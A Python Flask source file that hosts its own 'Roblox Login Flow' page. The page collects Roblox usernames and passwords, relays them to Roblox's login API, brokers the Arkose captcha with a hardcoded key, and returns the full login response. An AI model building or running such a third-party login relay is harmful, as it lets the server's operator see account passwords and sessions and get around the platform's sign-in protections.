from flask import Flask, render_template_string, request, jsonify
import os
import requests

app = Flask(__name__)

ROBLOX_PUBLIC_KEY = "476068BF-9607-4799-B53D-966BE98E2B81"
ARKOSE_SURL = "https://roblox-api.arkoselabs.com"

@app.route('/')
def home():
    return "BUHAY AKO! 💪 DM SELB"

@app.route('/roblox-login')
def roblox_login_page():
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Roblox Login Flow</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: #111; 
                color: white; 
                padding: 20px; 
                text-align: center; 
            }
            .container { 
                max-width: 900px; 
                margin: 0 auto; 
            }
            iframe { 
                border: 2px solid #555; 
                width: 100%; 
                max-width: 700px; 
                height: 620px; 
                margin: 20px auto; 
                display: block; 
            }
            input, button { 
                padding: 12px; 
                margin: 8px; 
                width: 80%; 
                max-width: 400px; 
                font-size: 16px;
                background: #1a1a1a;
                color: white;
                border: 1px solid #555;
                border-radius: 4px;
            }
            button {
                cursor: pointer;
                background: #0066cc;
                border: none;
            }
            button:hover {
                background: #0052a3;
            }
            pre { 
                background: #1a1a1a; 
                padding: 15px; 
                text-align: left; 
                max-height: 500px; 
                overflow: auto;
                border: 1px solid #555;
                border-radius: 4px;
            }
            .success { color: #00ff00; }
            .error { color: #ff4444; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Roblox Login Flow (Login First → Captcha)</h2>
            
            <h3>Enter Credentials First</h3>
            <input type="text" id="username" placeholder="Username / Email" /><br>
            <input type="password" id="password" placeholder="Password" /><br>
            <button onclick="triggerChallenge()">1. Trigger Challenge + Load Captcha</button>

            <div id="captcha-section" style="display:none;">
                <h3>Solve Captcha Below</h3>
                <div id="arkose-container"></div>
            </div>

            <button onclick="startFinalLogin()" style="margin-top:15px;">2. Send Final Login</button>

            <pre id="result"></pre>
        </div>

        <script src="https://client-api.arkoselabs.com/v2/client.js"></script>
        <script>
            let captchaToken = "";
            let challengeId = "";
            let arkoseEngine = null;

            async function triggerChallenge() {
                const user = document.getElementById('username').value.trim();
                const pass = document.getElementById('password').value.trim();
                const resEl = document.getElementById('result');

                if (!user || !pass) {
                    resEl.textContent = "❌ Enter username and password first!";
                    resEl.className = 'error';
                    return;
                }

                resEl.textContent = "Triggering Roblox challenge...\\n";
                resEl.className = '';

                try {
                    const resp = await fetch('/api/trigger-challenge', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: user,
                            password: pass
                        })
                    });

                    const data = await resp.json();

                    if (!resp.ok) {
                        resEl.textContent = `❌ Error: ${data.error}`;
                        resEl.className = 'error';
                        return;
                    }

                    challengeId = data.challengeId || "";
                    resEl.textContent += `✅ Challenge triggered!\\nLoading captcha...\\n`;
                    
                    // Initialize Arkose Engine with proper config
                    document.getElementById('captcha-section').style.display = 'block';
                    
                    ARKOSE.setConfig({
                        variant: 'default',
                        onCompleted: onCaptchaCompleted,
                        onError: onCaptchaError,
                        onReady: () => {
                            resEl.textContent += "✅ Captcha ready for solving...\\n";
                        }
                    });

                    arkoseEngine = new ARKOSE.EngineLoader(data.publicKey, data.arkoseSurl);

                } catch(err) {
                    resEl.textContent += `\\n❌ Error: ${err.message}`;
                    resEl.className = 'error';
                }
            }

            function onCaptchaCompleted(response) {
                captchaToken = response.token || response;
                document.getElementById('result').textContent += "✅ Captcha Solved! Token Received!\\n";
                document.getElementById('result').className = 'success';
            }

            function onCaptchaError(error) {
                const resEl = document.getElementById('result');
                resEl.textContent += `\\n❌ Captcha Error: ${error}`;
                resEl.className = 'error';
            }

            async function startFinalLogin() {
                const user = document.getElementById('username').value.trim();
                const pass = document.getElementById('password').value.trim();
                const resEl = document.getElementById('result');

                if (!captchaToken) {
                    resEl.textContent += "\\n❌ Solve captcha first!";
                    resEl.className = 'error';
                    return;
                }

                resEl.textContent += "\\nSending final login with token...\\n";

                try {
                    const resp = await fetch('/api/final-login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: user,
                            password: pass,
                            captchaToken: captchaToken,
                            challengeId: challengeId
                        })
                    });

                    const data = await resp.json();
                    
                    if (!resp.ok) {
                        resEl.textContent += `❌ Login failed: ${data.error}`;
                        resEl.className = 'error';
                    } else {
                        resEl.textContent += `✅ Login successful!\\n${JSON.stringify(data, null, 2)}`;
                        resEl.className = 'success';
                    }
                } catch(err) {
                    resEl.textContent += `\\n❌ Error: ${err.message}`;
                    resEl.className = 'error';
                }
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/api/trigger-challenge', methods=['POST'])
def trigger_challenge():
    """Server-side endpoint to trigger Roblox challenge"""
    try:
        data = request.json
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()

        if not username or not password:
            return jsonify({'error': 'Username and password required'}), 400

        # Call Roblox auth API
        resp = requests.post('https://auth.roblox.com/v2/login', 
            json={
                'ctype': 'Username',
                'cvalue': username,
                'password': password
            },
            timeout=10
        )

        challenge_id = resp.headers.get('rblx-challenge-id', '')
        
        return jsonify({
            'challengeId': challenge_id,
            'publicKey': ROBLOX_PUBLIC_KEY,
            'arkoseSurl': ARKOSE_SURL,
            'status': 'challenge_triggered'
        }), 200

    except requests.exceptions.RequestException as e:
        return jsonify({'error': f'Roblox API error: {str(e)}'}), 500
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/api/final-login', methods=['POST'])
def final_login():
    """Server-side endpoint for final login with captcha token"""
    try:
        data = request.json
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        captcha_token = data.get('captchaToken', '').strip()
        challenge_id = data.get('challengeId', '').strip()

        if not all([username, password, captcha_token]):
            return jsonify({'error': 'Missing required fields'}), 400

        # Send final login request to Roblox
        resp = requests.post('https://auth.roblox.com/v2/login',
            json={
                'ctype': 'Username',
                'cvalue': username,
                'password': password,
                'captchaToken': captcha_token,
                'captchaProvider': 'PROVIDER_ARKOS_LABS',
                'challengeId': challenge_id
            },
            timeout=10
        )

        result = resp.json()

        if resp.status_code == 200:
            return jsonify({
                'status': 'success',
                'data': result
            }), 200
        else:
            return jsonify({
                'error': result.get('message', 'Login failed'),
                'details': result
            }), resp.status_code

    except requests.exceptions.RequestException as e:
        return jsonify({'error': f'Roblox API error: {str(e)}'}), 500
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
